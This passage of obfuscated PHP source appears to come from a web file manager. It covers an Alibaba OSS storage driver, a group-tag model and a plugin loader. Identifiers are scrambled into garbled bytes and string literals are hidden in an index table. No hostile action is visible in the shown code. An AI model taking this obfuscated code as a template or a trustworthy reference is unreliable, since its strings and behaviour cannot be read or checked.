$àĞ“É©, $¬ÂÙÁºÊ); } catch (OSS\Core\OssException $Ã®“øØ½) { return !1; } return $this->getPathOuter($ŞÂÃÂ); } public function getHost() { $™»ÚşÙ =& $_SERVER[…É¦À–]; $ˆÎû ˜î = explode($™»ÚşÙ[184], parent::getHost()); return $ˆÎû ˜î[0] . $™»ÚşÙ[184] . $this->bucket . $™»ÚşÙ[10] . $ˆÎû ˜î[1]; } public function uploadFormData($Úİóœ’, $Äá½›„½ = 3600) { $†ûÕÑû =& $_SERVER[…É¦À–]; if (!($ºİÊ¼‘ä = $this->getHost())) { return !1; } $½±Ú×¤Ë = $Äá½›„½; $÷ÚÑİÁ³ = date($†ûÕÑû[1443], time() + $½±Ú×¤Ë); $„ÏáµèŞ = new DateTime($÷ÚÑİÁ³); $©ú ÄÓ– = $„ÏáµèŞ->format(DateTime::ISO8601); $ûâ–”·ã = strpos($©ú ÄÓ–, $†ûÕÑû[325]); $©ú ÄÓ– = substr($©ú ÄÓ–, 0, $ûâ–”·ã) . $†ûÕÑû[1444]; $—¸Åš¸– = 1048576000 * 5; $Ş©‡Ñ™ó = $this->pathFather($Úİóœ’); $Í²à€§ó = array($†ûÕÑû[243] => $©ú ÄÓ–, $†ûÕÑû[246] => array(array($†ûÕÑû[1445], 0, $—¸Åš¸–), array($†ûÕÑû[249], $†ûÕÑû[250], $Ş©‡Ñ™ó))); $éÌ×ÕÓ¢ = base64_encode(json_encode($Í²à€§ó)); $áÓóû‘ß = base64_encode(hash_hmac($†ûÕÑû[232], $éÌ×ÕÓ¢, $this->secret, !0)); $™©²¯ÁŸ = array($†ûÕÑû[261] => $éÌ×ÕÓ¢, $†ûÕÑû[1446] => $this->accessKey, $†ûÕÑû[253] => $†ûÕÑû[242], $†ûÕÑû[1447] => $áÓóû‘ß, $†ûÕÑû[182] => $ºİÊ¼‘ä); $™©²¯ÁŸ = $this->trafficLimit($†ûÕÑû[1440], $™©²¯ÁŸ); return $™©²¯ÁŸ; } public function multiUploadFormData($”¦Â‡‡, $â†ùèíü = 3600) { $ÖÍ‘… =& $_SERVER[…É¦À–]; if (!($è­èÆâç = $this->getHost())) { return !1; } $ô¸²‘é = $this->trafficLimit($ÖÍ‘…[1440]); $™ºòÀ¹ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($”¦Â‡‡), $ô¸²‘é); return array($ÖÍ‘…[223] => $™ºòÀ¹, $ÖÍ‘…[182] => $è­èÆâç . $ÖÍ‘…[8] . $this->pathEncode($”¦Â‡‡), $ÖÍ‘…[224] => gmdate($ÖÍ‘…[1448]), $ÖÍ‘…[94] => $”¦Â‡‡); } public function multiUploadAuthData($Ë”©ãÎÅ, $Ï „ƒÎ = array()) { $¨¼ßŠÚó =& $_SERVER[…É¦À–]; $Ÿ¶³¤‹È = isset($Ï „ƒÎ[$¨¼ßŠÚó[224]]) ? $Ï „ƒÎ[$¨¼ßŠÚó[224]] : gmdate($¨¼ßŠÚó[1448]); $ÒÒçá = isset($Ï „ƒÎ[$¨¼ßŠÚó[174]]) ? $Ï „ƒÎ[$¨¼ßŠÚó[174]] : $¨¼ßŠÚó[12]; $ıï±´…­ = $Ë”©ãÎÅ; if (isset($Ï „ƒÎ[$¨¼ßŠÚó[94]])) { $ıï±´…­ = $Ï „ƒÎ[$¨¼ßŠÚó[94]]; unset($Ï „ƒÎ[$¨¼ßŠÚó[94]]); } if (isset($Ï „ƒÎ[$¨¼ßŠÚó[225]])) { $Ï „ƒÎ[$¨¼ßŠÚó[224]] = $Ÿ¶³¤‹È; return $this->listUploadParts($ıï±´…­, $Ï „ƒÎ); } $±çÌ†æ„ = array($¨¼ßŠÚó[226], $¨¼ßŠÚó[12], $¨¼ßŠÚó[120], $Ÿ¶³¤‹È, "\170\x2d\x6f\163\x73\x2d\144\141\x74\x65\72{$Ÿ¶³¤‹È}", $¨¼ßŠÚó[8] . $this->bucket . $¨¼ßŠÚó[8] . $ıï±´…­ . $ÒÒçá); if (strpos($ÒÒçá, $¨¼ßŠÚó[227]) === 0) { $±çÌ†æ„[0] = $¨¼ßŠÚó[228]; if ($ñÜı›×€ = $this->trafficLimit($¨¼ßŠÚó[1440])) { $ıï±´…­ = $¨¼ßŠÚó[1449]; array_splice($±çÌ†æ„, 5, 0, $ıï±´…­ . $¨¼ßŠÚó[4] . $ñÜı›×€[$ıï±´…­]); } } if (isset($Ï „ƒÎ[$¨¼ßŠÚó[229]]) && $Ï „ƒÎ[$¨¼ßŠÚó[229]] == $¨¼ßŠÚó[230]) { $±çÌ†æ„[0] = $¨¼ßŠÚó[230]; } if (!empty($Ï „ƒÎ[$¨¼ßŠÚó[1450]])) { $„‚Şğ¸Î = array_merge(array($±çÌ†æ„[4]), $Ï „ƒÎ[$¨¼ßŠÚó[1450]]); sort($„‚Şğ¸Î); $±çÌ†æ„[4] = implode($¨¼ßŠÚó[231], $„‚Şğ¸Î); } $ÖşÖ–ò = implode($¨¼ßŠÚó[231], $±çÌ†æ„); $ÏÒ†Õßë = base64_encode(hash_hmac($¨¼ßŠÚó[232], $ÖşÖ–ò, $this->secret, !0)); $ÛÎ»á«Û = $¨¼ßŠÚó[1414] . $this->accessKey . $¨¼ßŠÚó[4] . $ÏÒ†Õßë; if (strpos($ÒÒçá, $¨¼ßŠÚó[227]) === 0) { $ÛÎ»á«Û = array($¨¼ßŠÚó[234] => $ÛÎ»á«Û, $¨¼ßŠÚó[224] => $Ÿ¶³¤‹È); if ($ñÜı›×€) { $ÛÎ»á«Û = array_merge($ÛÎ»á«Û, $ñÜı›×€); } } return $ÛÎ»á«Û; } public function listUploadParts($ğ’Ò©âÀ, $ˆûŸ£Ô) { $ŸïÄàê‚ =& $_SERVER[…É¦À–]; $Ë¦´úªû = parse_url_query($ˆûŸ£Ô[$ŸïÄàê‚[174]]); $±£ãÉ–Ş = $this->client->listParts($this->bucket, $this->pathEncode($ğ’Ò©âÀ), $Ë¦´úªû[$ŸïÄàê‚[223]]); $°¹ÏùØÄ = $±£ãÉ–Ş->getListPart(); $Êƒß©ÜÅ = array(); foreach ($°¹ÏùØÄ as $ï¯›‰) { $Êƒß©ÜÅ[] = array($ŸïÄàê‚[1434] => $ï¯›‰->getPartNumber(), $ŸïÄàê‚[1435] => trim($ï¯›‰->getETag(), $ŸïÄàê‚[118])); } unset($ˆûŸ£Ô[$ŸïÄàê‚[225]], $ˆûŸ£Ô[$ŸïÄàê‚[229]]); $ü¹‡âİ· = $this->multiUploadAuthData($ğ’Ò©âÀ, $ˆûŸ£Ô); if (empty($ü¹‡âİ·)) { return !1; } return array($ŸïÄàê‚[234] => $ü¹‡âİ·, $ŸïÄàê‚[224] => $ˆûŸ£Ô[$ŸïÄàê‚[224]], $ŸïÄàê‚[236] => $Êƒß©ÜÅ); } public function download($ıû©´Î”, $Ê±ßÂÎó) { if ($this->isFolder($ıû©´Î”)) { return !1; } try { $Ÿœ¡ˆÎ‚ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $Ê±ßÂÎó); $Ÿœ¡ˆÎ‚ = $this->trafficLimit($_SERVER[…É¦À–][109], $Ÿœ¡ˆÎ‚); $this->client->getObject($this->bucket, $this->pathEncode($ıû©´Î”), $Ÿœ¡ˆÎ‚); } catch (OSS\Core\OssException $ø¾ÌÏšÑ) { return !1; } return $Ê±ßÂÎó; } public function fileSubstr($ä·ˆéÒ, $øŒß£Æ¼ = 0, $³“è¢©Ÿ = false) { if ($øŒß£Æ¼ === -1) { $ƒË¨‰ä = array(); } else { if ($³“è¢©Ÿ === !1) { $ÌæÙõæ‰ = $this->size($ä·ˆéÒ); } else { $ÌæÙõæ‰ = $øŒß£Æ¼ + $³“è¢©Ÿ - 1; } $ƒË¨‰ä = array(OSS\OssClient::OSS_RANGE => "{$øŒß£Æ¼}\x2d{$ÌæÙõæ‰}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ä·ˆéÒ), $ƒË¨‰ä); } catch (OSS\Core\OssException $†ÇìàÙ) { think_exception($†ÇìàÙ->getMessage()); return !1; } } private function trafficLimit($áÔ×¾şÚ, $áÁ—–âñ = array()) { $”Âò¤¹¸ =& $_SERVER[…É¦À–]; if ($áÔ×¾şÚ == $”Âò¤¹¸[1440] && $this->isUploadServer() || $áÔ×¾şÚ == $”Âò¤¹¸[109] && $this->isFileOutServer()) { return $áÁ—–âñ; } $­©Û›æã = floatval($GLOBALS[$”Âò¤¹¸[6]][$”Âò¤¹¸[89]][$”Âò¤¹¸[107]][$áÔ×¾şÚ]) * 1024 * 1024 * 8; if (!$­©Û›æã) { return $áÁ—–âñ; } $­©Û›æã = $­©Û›æã < 819200 ? 819200 : ($­©Û›æã > 838860800 ? 838860800 : $­©Û›æã); $áÁ—–âñ[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($­©Û›æã); return $áÁ—–âñ; } public function link($ÒœÂä–ë, $¥’íã… = array()) { $øã×¬ =& $_SERVER[…É¦À–]; if (!$this->exist($ÒœÂä–ë) || $this->isFolder($ÒœÂä–ë)) { return !1; } try { $¥’íã… = $this->trafficLimit($øã×¬[109], $¥’íã…); $ïÚÁô¸Ì = $this->client->signUrl($this->bucket, $this->pathEncode($ÒœÂä–ë), 3600 * 12, $øã×¬[230], $¥’íã…); return $this->getCdnLink($ïÚÁô¸Ì); } catch (OSS\Core\OssException $µúˆŞï¾) { return !1; } } public function fileOut($ÆÇ©ç„’, $ì†ç¥ë = false, $Û°ª÷“¢ = false, $ÛÍ–Ù‡ã = '') { $·¹ŸÙŒ» =& $_SERVER[…É¦À–]; if ($this->isFileOutServer()) { return $this->fileOutServer($ÆÇ©ç„’, $ì†ç¥ë, $Û°ª÷“¢, $ÛÍ–Ù‡ã); } if (!$Û°ª÷“¢) { $Û°ª÷“¢ = $this->pathThis($ÆÇ©ç„’); } $Û°ª÷“¢ = rawurlencode($Û°ª÷“¢); $öàç÷˜ó = get_file_mime(get_path_ext($Û°ª÷“¢)); if ($öàç÷˜ó == $·¹ŸÙŒ»[217]) { return parent::fileOut($ÆÇ©ç„’, $ì†ç¥ë, $Û°ª÷“¢, $ÛÍ–Ù‡ã); } $ì†ç¥ë = $ì†ç¥ë ? $·¹ŸÙŒ»[1451] : $·¹ŸÙŒ»[1452]; $Ÿº‡³Ä = array(OSS\OssClient::OSS_SUB_RESOURCE => $·¹ŸÙŒ»[1453] . rawurlencode("{$ì†ç¥ë}\x3b\146\151\x6c\145\x6e\x61\155\x65\75{$Û°ª÷“¢}")); $Ÿº‡³Ä[OSS\OssClient::OSS_SUB_RESOURCE] .= $·¹ŸÙŒ»[1454] . rawurlencode($öàç÷˜ó); $Şš…Ç‰¹ = $this->link($ÆÇ©ç„’, $Ÿº‡³Ä); $this->fileOutLink($Şš…Ç‰¹); } public function fileOutServer($×ù·ø­, $¾Ü ÏîÃ = false, $ûö£ÓÓÁ = false, $øï’©èœ = '') { parent::fileOut($×ù·ø­, $¾Ü ÏîÃ, $ûö£ÓÓÁ, $øï’©èœ); } public function fileOutImage($Ÿ°¿€¦, $¢¿‹®ö = 250) { if ($this->size($Ÿ°¿€¦) > 1024 * 1024 * 20) { return $this->fileOutImageServer($Ÿ°¿€¦, $¢¿‹®ö); } $¸ò‡ë˜ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[…É¦À–][1455] . $¢¿‹®ö); $Ùàş¿ = $this->link($Ÿ°¿€¦, $¸ò‡ë˜); $this->fileOutLink($Ùàş¿); } public function fileOutImageServer($ç¯”Úış, $äÊœ¤é° = 250) { parent::fileOutImage($ç¯”Úış, $äÊœ¤é°); } public function fileOutLink($Ø¨‡ÀÀ) { $’üÛÅ‰ =& $_SERVER[…É¦À–]; if (!$this->isCdnHost() && substr($Ø¨‡ÀÀ, 0, 7) == $’üÛÅ‰[1376]) { $Ø¨‡ÀÀ = $’üÛÅ‰[1377] . substr($Ø¨‡ÀÀ, 7); } header($’üÛÅ‰[161] . $Ø¨‡ÀÀ); die; } public function hashMd5($“ù½¾ƒ, $€®Ôü· = '') { $È™Èş®Ê =& $_SERVER[…É¦À–]; $©äãİ‚” = $this->_objectMeta($“ù½¾ƒ); if (!$©äãİ‚”) { return $È™Èş®Ê[12]; } if (!isset($©äãİ‚”[$È™Èş®Ê[1430]]) && !empty($€®Ôü·)) { $¨„†åªÕ = $this->updateObjMeta($“ù½¾ƒ, array($È™Èş®Ê[1430] => $€®Ôü·)); $©äãİ‚”[$È™Èş®Ê[1430]] = $¨„†åªÕ ? $€®Ôü· : $È™Èş®Ê[12]; } return isset($©äãİ‚”[$È™Èş®Ê[1430]]) ? strtolower($©äãİ‚”[$È™Èş®Ê[1430]]) : $È™Èş®Ê[12]; } public function size($éé”¨§) { $Á¨öà†€ = $this->objectMeta($éé”¨§); return $Á¨öà†€ ? $Á¨öà†€[$_SERVER[…É¦À–][76]] : 0; } public function info($¢âÛŞíœ) { if ($this->isFolder($¢âÛŞíœ)) { return $this->folderInfo($¢âÛŞíœ); } else { if ($this->isFile($¢âÛŞíœ)) { return $this->fileInfo($¢âÛŞíœ); } } return !1; } public function exist($”Æ–Ìö£) { return $this->isFile($”Æ–Ìö£) || $this->isFolder($”Æ–Ìö£); } public function isFile($ÆĞàş€½) { return !$this->isFolder($ÆĞàş€½) && $this->objectMeta($ÆĞàş€½); } public function isFolder($¹¹Å¢¹¹) { return $this->cacheMethod($_SERVER[…É¦À–][165], $¹¹Å¢¹¹); } protected function objectMeta($’àôõ×¶) { return $this->cacheMethod($_SERVER[…É¦À–][167], $’àôõ×¶); } protected function _objectMeta($ğ˜«ñø•) { $‹Çªü¤¤ =& $_SERVER[…É¦À–]; try { $×£ª×öĞ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($ğ˜«ñø•)); } catch (OSS\Core\OssException $ûÁ•Î•©) { $×£ª×öĞ = !1; } if ($×£ª×öĞ) { $×£ª×öĞ[$‹Çªü¤¤[76]] = intval($×£ª×öĞ[$‹Çªü¤¤[1428]]); } return $×£ª×öĞ; } protected function _isFolder($Œ½ãòŠà) { $§Îç¸‡Œ =& $_SERVER[…É¦À–]; if ($Œ½ãòŠà == $§Îç¸‡Œ[12] || $Œ½ãòŠà == $§Îç¸‡Œ[8]) { return !0; } $„³ÊºÈ = array($§Îç¸‡Œ[1424] => $§Îç¸‡Œ[8], $§Îç¸‡Œ[1425] => rtrim($Œ½ãòŠà, $§Îç¸‡Œ[8]) . $§Îç¸‡Œ[8], $§Îç¸‡Œ[1426] => 1, $§Îç¸‡Œ[1427] => $§Îç¸‡Œ[12]); $™Í½º™Û = $this->client->listObjects($this->bucket, $„³ÊºÈ); if ($™Í½º™Û->getObjectList() || $™Í½º™Û->getPrefixList()) { return !0; } return !1; } } goto CˆÙ•´› ; cÒ¥í¦÷©Ÿ: class GroupTagModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\x66\141\166"; protected function cacheFunctionAlias($øãÚˆ¦”) { $¦¿ŒÙ¨Ô =& $_SERVER[…É¦À–]; return array($¦¿ŒÙ¨Ô[1986] => array($øãÚˆ¦”[0], $¦¿ŒÙ¨Ô[1987]), $¦¿ŒÙ¨Ô[1988] => array($øãÚˆ¦”[0], $¦¿ŒÙ¨Ô[1989])); } protected function get($ÅŞòÏ’ø) { $¦ùø’Åı =& $_SERVER[…É¦À–]; $ùÃ¹Ğ³² = Model($¦ùø’Åı[541])->metaGet($ÅŞòÏ’ø, $¦ùø’Åı[1990]); $äÌ¬Óº° = json_decode($ùÃ¹Ğ³², !0); return $äÌ¬Óº° ? $äÌ¬Óº° : array($¦ùø’Åı[1991] => $¦ùø’Åı[88], $¦ùø’Åı[398] => array()); } protected function set($ĞûÍ¯, $…ÌĞüŒ») { $¿ã¾ÁÃø =& $_SERVER[…É¦À–]; $…ÌĞüŒ» = $…ÌĞüŒ» ? $…ÌĞüŒ» : array($¿ã¾ÁÃø[1991] => $¿ã¾ÁÃø[88], $¿ã¾ÁÃø[398] => array()); return Model($¿ã¾ÁÃø[541])->metaSet($ĞûÍ¯, $¿ã¾ÁÃø[1990], json_encode($…ÌĞüŒ»)); } protected function getByTagID($³•ÅÍ, $”‡ìƒñ¦) { $§æ‘€Ç =& $_SERVER[…É¦À–]; if (!$³•ÅÍ || !$”‡ìƒñ¦) { return !1; } if (!Model($§æ‘€Ç[541])->getInfoSimple($³•ÅÍ)) { return !1; } $¸§‰÷û» = $this->get($³•ÅÍ); if (!$¸§‰÷û» || !isset($¸§‰÷û»[$§æ‘€Ç[398]])) { return !1; } $öãùôÛŞ = array_find_by_field($¸§‰÷û»[$§æ‘€Ç[398]], $§æ‘€Ç[428], $”‡ìƒñ¦); return is_array($öãùôÛŞ) ? $öãùôÛŞ : !1; } public function listSource($™à‡Ä¦¦, $õŒ„ñŸ’) { $§×…¸ß =& $_SERVER[…É¦À–]; if ($õŒ„ñŸ’ && !is_array($õŒ„ñŸ’)) { $õŒ„ñŸ’ = array($õŒ„ñŸ’); } $ó°‚¨é¢ = $this->listData($™à‡Ä¦¦); $¥ê¹”Å· = array(); foreach ($ó°‚¨é¢ as $“ƒ˜¯Ô¾) { $Ú·‘İ§ = $“ƒ˜¯Ô¾[$§×…¸ß[84]]; if (!$Ú·‘İ§) { continue; } if (!isset($¥ê¹”Å·[$Ú·‘İ§])) { $¥ê¹”Å·[$Ú·‘İ§] = array(); } $¥ê¹”Å·[$Ú·‘İ§][] = $“ƒ˜¯Ô¾[$§×…¸ß[455]]; } $ñ½Ñà½† = array(); foreach ($¥ê¹”Å· as $Ÿå½Ï¢” => $ûÎ©µ¬ä) { $åÄ„­ñ­ = !0; if (!$õŒ„ñŸ’) { $ñ½Ñà½†[] = $Ÿå½Ï¢”; continue; } foreach ($õŒ„ñŸ’ as $»÷á„Íñ) { if (!in_array($»÷á„Íñ, $ûÎ©µ¬ä)) { $åÄ„­ñ­ = !1; break; } } if ($åÄ„­ñ­) { $ñ½Ñà½†[] = $Ÿå½Ï¢”; } } if (!$ñ½Ñà½†) { return array(); } $›¿À¦ëı = array($§×…¸ß[446] => array($§×…¸ß[447], $ñ½Ñà½†), $§×…¸ß[525] => $™à‡Ä¦¦, $§×…¸ß[440] => SourceModel::TYPE_GROUP); $£¥™§¯« = Model($§×…¸ß[1378])->listSource($›¿À¦ëı); if (!$£¥™§¯« || count($ñ½Ñà½†) == $£¥™§¯«[$§×…¸ß[395]][$§×…¸ß[396]]) { return $£¥™§¯«; } $óûÂÜÁ‹ = array(); $¹Îİ¤ü¶ = array_to_keyvalue($£¥™§¯«[$§×…¸ß[82]], $§×…¸ß[12], $§×…¸ß[431]); $¨Øèâª‡ = array_to_keyvalue($£¥™§¯«[$§×…¸ß[83]], $§×…¸ß[12], $§×…¸ß[431]); $¡ÃÑé”¹ = array_merge($¨Øèâª‡, $¹Îİ¤ü¶); foreach ($ñ½Ñà½† as $Ú·‘İ§) { if (!in_array($Ú·‘İ§, $¡ÃÑé”¹)) { $óûÂÜÁ‹[] = $Ú·‘İ§; } } if ($óûÂÜÁ‹) { $this->removeBySource($™à‡Ä¦¦, $óûÂÜÁ‹); } return $£¥™§¯«; } protected function listData($Ë³¿éõÉ) { $¢¼ãŞŠ =& $_SERVER[…É¦À–]; $‰èÄĞá = array($¢¼ãŞŠ[1678] => 0, $¢¼ãŞŠ[512] => array($¢¼ãŞŠ[1992], 0), $¢¼ãŞŠ[451] => $¢¼ãŞŠ[1993] . $Ë³¿éõÉ); $ÃêÂŞà = $¢¼ãŞŠ[1994]; $Ï¥¯æªµ = $this->field($ÃêÂŞà)->where($‰èÄĞá)->order($¢¼ãŞŠ[1995])->select(); return $Ï¥¯æªµ ? $Ï¥¯æªµ : array(); } protected function addToTag($´ÏÁÔÂá, $ûª™Ê£Õ, $”á·İ¿) { $Ç¨Œ¿Ïü =& $_SERVER[…É¦À–]; if (!$this->getByTagID($´ÏÁÔÂá, $”á·İ¿) || !$ûª™Ê£Õ) { return !1; } if (!Model($Ç¨Œ¿Ïü[865])->pathInfo($ûª™Ê£Õ)) { return !1; } $Â›Ğ‘Íó = array($Ç¨Œ¿Ïü[1678] => 0, $Ç¨Œ¿Ïü[512] => $”á·İ¿, $Ç¨Œ¿Ïü[450] => $ûª™Ê£Õ, $Ç¨Œ¿Ïü[451] => $Ç¨Œ¿Ïü[1996] . $´ÏÁÔÂá, $Ç¨Œ¿Ïü[449] => $Ç¨Œ¿Ïü[12], $Ç¨Œ¿Ïü[1881] => 0); if ($this->where($Â›Ğ‘Íó)->find()) { return !1; } return $this->add($Â›Ğ‘Íó); } protected function removeFromTag($ƒ¶´µóµ, $•Üí¦‚ñ, $ùèùšËã) { $…ŒÅç =& $_SERVER[…É¦À–]; if (!$this->getByTagID($ƒ¶´µóµ, $ùèùšËã) || !$•Üí¦‚ñ) { return !1; } if (is_array($•Üí¦‚ñ)) { $•Üí¦‚ñ = array($…ŒÅç[7], $•Üí¦‚ñ); } $˜‡”õ´ó = array($…ŒÅç[1678] => 0, $…ŒÅç[512] => $ùèùšËã, $…ŒÅç[451] => $…ŒÅç[1996] . $ƒ¶´µóµ, $…ŒÅç[450] => $•Üí¦‚ñ); return $this->where($˜‡”õ´ó)->delete(); } protected function removeByTag($ìœÂßù½, $‘ØœúÇæ) { $ş¥•Ë‡ü =& $_SERVER[…É¦À–]; if (!$this->getByTagID($ìœÂßù½, $‘ØœúÇæ)) { return !1; } $ÓíÎá¤  = array($ş¥•Ë‡ü[1678] => 0, $ş¥•Ë‡ü[512] => $‘ØœúÇæ, $ş¥•Ë‡ü[451] => $ş¥•Ë‡ü[1996] . $ìœÂßù½); return $this->where($ÓíÎá¤ )->delete(); } protected function removeBySource($™ş‰¾“Ë, $‰Œâçı¾) { $êûëîÁâ =& $_SERVER[…É¦À–]; if (!$™ş‰¾“Ë || !$‰Œâçı¾) { return !1; } if (is_array($‰Œâçı¾)) { $‰Œâçı¾ = array($êûëîÁâ[7], $‰Œâçı¾); } $çˆíòÛë = array($êûëîÁâ[1678] => 0, $êûëîÁâ[450] => $‰Œâçı¾, $êûëîÁâ[512] => array($êûëîÁâ[1059], 0), $êûëîÁâ[451] => $êûëîÁâ[1996] . $™ş‰¾“Ë); return $this->where($çˆíòÛë)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\56\x70\154\165\x67\x69\156\x4c\x69\163\164"; public $field = array("\156\x61\155\145", "\x73\x74\141\164\165\163", "\x72\145\x67\151\x65\x73\164", "\x63\157\156\146\x69\147"); public function loadList($³î¥§ø = false) { $—¶Ëäõœ = array_to_keyvalue($this->listData(), $_SERVER[…É¦À–][32]); if ($³î¥§ø) { return $—¶Ëäõœ[$³î¥§ø]; } return $—¶Ëäõœ; } public function init() { $Æìœº¡ =& $_SERVER[…É¦À–]; Hook::trigger($Æìœº¡[1997]); $ÑÀÄ¤¨É = $this->loadPluginList(); foreach ($ÑÀÄ¤¨É as $Í®ƒ•‚‰ => $¤Ç¶¥…ƒ) { $»“’òæ¸ = $this->appAllow($Í®ƒ•‚‰, $¤Ç¶¥…ƒ); if (!$»“’òæ¸) { continue; } foreach ($¤Ç¶¥…ƒ[$Æìœº¡[1998]] as $ô‚‹İ¸¬ => $Õ³çéãü) { Hook::bind($ô‚‹İ¸¬, $Õ³çéãü); } } Hook::trigger($Æìœº¡[1999]); Hook::trigger(ACTION); } public function appAllow($°ŞşƒÙÆ, $üê ƒÍ”, $Ëˆé¯ØÙ = true) { $Ò©£±×º =& $_SERVER[…É¦À–]; $­¾Šœ = PLUGIN_DIR . $°ŞşƒÙÆ . $Ò©£±×º[2000]; if (!is_array($üê ƒÍ”) || !is_array($üê ƒÍ”[$Ò©£±×º[1998]]) || $üê ƒÍ”[$Ò©£±×º[790]] != 1 || !is_file($­¾Šœ)) { return !1; } if ($GLOBALS[$Ò©£±×º[523]] == 1) { if ($GLOBALS[$Ò©£±×º[6]][$Ò©£±×º[2001]] || !$GLOBALS[$Ò©£±×º[6]][$Ò©£±×º[2002]]) { return !0; } $ü²è†Œı = explode($Ò©£±×º[50], strtolower($GLOBALS[$Ò©£±×º[6]][$Ò©£±×º[2002]])); return in_array(strtolower($°ŞşƒÙÆ), $ü²è†Œı) ? !1 : !0; } if ($Ëˆé¯ØÙ && !Action($Ò©£±×º[2003])->checkAuth($°ŞşƒÙÆ)) { return !1; } return !0; } public function unInstall($®Ã´¡´²) { $ˆ˜ı˜ş =& $_SERVER[…É¦À–]; $‚Ñ÷İ®È = $this->loadList($®Ã´¡´²); if (file_exists(PLUGIN_DIR . $®Ã´¡´²)) { Hook::apply($®Ã´¡´² . $ˆ˜ı˜ş[2004]); } $this->remove($‚Ñ÷İ®È[$ˆ˜ı˜ş[428]]); } public function changeStatus($›ûè‡‡×, $“îÇ¯Íê) { $‘ÀúÖÈÌ =& $_SERVER[…É¦À–]; $¨µÆ¢¢œ = $this->loadList($›ûè‡‡×); if ($“îÇ¯Íê) { Hook::apply($›ûè‡‡× . $‘ÀúÖÈÌ[2005]); } $this->update($¨µÆ¢¢œ[$‘ÀúÖÈÌ[428]], array($‘ÀúÖÈÌ[2006] => $“îÇ¯Íê)); } public function appRegist($ü·ä€Õå, $Ù³ï­Ï) { $ÃÃá° =& $_SERVER[…É¦À–]; $»¡‰Ù‚Î = $this->loadList($ü·ä€Õå); if ($»¡‰Ù‚Î) { $this->update($»¡‰Ù‚Î[$ÃÃá°[428]], array($ÃÃá°[1998] => $Ù³ï­Ï)); } else { $©‚è¿·— = array($ÃÃá°[32] => $ü·ä€Õå, $ÃÃá°[1998] => $Ù³ï­Ï, $ÃÃá°[790] => 0, $ÃÃá°[6] => $this->getConfigDefault($ü·ä€Õå)); $this->insert($©‚è¿·—); } } public function getConfigDefault($—·Ëè«È) { $ê“Ö¾ É =& $_SERVER[…É¦À–]; $˜ÕÛ±·Ÿ = array(); $Õ²Ñ¬Ô = $this->getPackageJson($—·Ëè«È); if (!$Õ²Ñ¬Ô && is_array($Õ²Ñ¬Ô[$ê“Ö¾ É[2007]])) { return $˜ÕÛ±·Ÿ; } foreach ($Õ²Ñ¬Ô[$ê“Ö¾ É[2007]] as $îŠÖ‡æ => $×¾ıÏ¶Œ) { if (!isset($×¾ıÏ¶Œ[$ê“Ö¾ É[403]]) || isset($˜ÕÛ±·Ÿ[$îŠÖ‡æ])) { continue; } $˜ÕÛ±·Ÿ[$îŠÖ‡æ] = $×¾ıÏ¶Œ[$ê“Ö¾ É[403]]; } return $˜ÕÛ±·Ÿ; } public function getPackageJson($ÔÜ¼ÛÁŞ) { return Hook::apply($ÔÜ¼ÛÁŞ . $_SERVER[…É¦À–][2008]); } public function getConfig($¥èØ¸’, $ÕëéÜòâ = false) { $ñ±Í·ëÃ =& $_SERVER[…É¦À–]; $Ùı‘İîí = array(); $à³àò® = $this->loadList($¥èØ¸’); if ($à³àò® && is_array($à³àò®[$ñ±Í·ëÃ[6]])) { $Ùı‘İîí = $à³àò®[$ñ±Í·ëÃ[6]]; } if (!$Ùı‘İîí || $ÕëéÜòâ) { $Ùı‘İîí = $this->getConfigDefault($¥èØ¸’); } return $Ùı‘İîí; } public function setConfig($†ø²î»ë, $šçƒ‚ğ = false) { $¡¤çò¬½ =& $_SERVER[…É¦À–]; $Òàâ ¡ = $this->loadList($†ø²î»ë); if (!$Òàâ ¡) { return !1; } $ŸŸïš×± = $Òàâ ¡[$¡¤çò¬½[6]]; if ($šçƒ‚ğ == !1) { $ŸŸïš×± = array(); $šçƒ‚ğ = $this->getConfigDefault($†ø²î»ë); } foreach ($šçƒ‚ğ as $“‘ÑªÊõ => $ªƒ®²„ò) { $ŸŸïš×±[$“‘ÑªÊõ] = is_string($ªƒ®²„ò) ? trim($ªƒ®²„ò) : $ªƒ®²„ò; } $this->update($Òàâ ¡[$¡¤çò¬½[428]], array($¡¤çò¬½[6] => $ŸŸïš×±)); } public function viewList() { $ùŒ¹ßªş =& $_SERVER[…É¦À–]; $§åã¥Š¸ = $this->loadList(); $this->pluginScan($§åã¥Š¸); $§åã¥Š¸ = $this->loadPluginList(); $è¸„ëé = array(); foreach ($§åã¥Š¸ as $ø¥ñ®‘ => $²Úòû’©) { unset($²Úòû’©[$ùŒ¹ßªş[1998]], $²Úòû’©[$ùŒ¹ßªş[6]]); $Øê™ş‡ö = PLUGIN_DIR . $²Úòû’©[$ùŒ¹ßªş[32]] . $ùŒ¹ßªş[2000]; if (!is_file($Øê™ş‡ö)) { continue; } $• ¶¤£ó = Hook::apply($²Úòû’©[$ùŒ¹ßªş[32]] . $ùŒ¹ßªş[2008]); if (is_array($• ¶¤£ó)) { $è¸„ëé[$ø¥ñ®‘] = array_merge($²Úòû’©, $• ¶¤£ó); } } return $è¸„ëé; } private function loadPluginList() { $’«âÏ‡ =& $_SERVER[…É¦À–]; $°ÛáµÎ¯ = $this->loadList(); if (strtolower(MOD) == $’«âÏ‡[2009]) { return $°ÛáµÎ¯; } $±ÄÆí§ì = Hook::trigger($’«âÏ‡[2010], $°ÛáµÎ¯); if ($°ÛáµÎ¯ && !$±ÄÆí§ì) { die; } return $±ÄÆí§ì ? $±ÄÆí§ì : $°ÛáµÎ¯; } private function pluginScan($­Öä®·¿) { $ë°¥ÆáÍ =& $_SERVER[…É¦À–]; recursion_dir(PLUGIN_DIR, $²¢¯½Á, $üÅ¤å“, 0); foreach ($²¢¯½Á as $Å¹×ÀÃÍ) { $ÈÙÖ±ƒÓ = get_path_this($Å¹×ÀÃÍ); if (isset($­Öä®·¿[$ÈÙÖ±ƒÓ]) || !file_exists($Å¹×ÀÃÍ . $ë°¥ÆáÍ[2011]) || !file_exists($Å¹×ÀÃÍ . $ë°¥ÆáÍ[2000])) { continue; } Hook::apply($ÈÙÖ±ƒÓ . $ë°¥ÆáÍ[2005]); } } } class 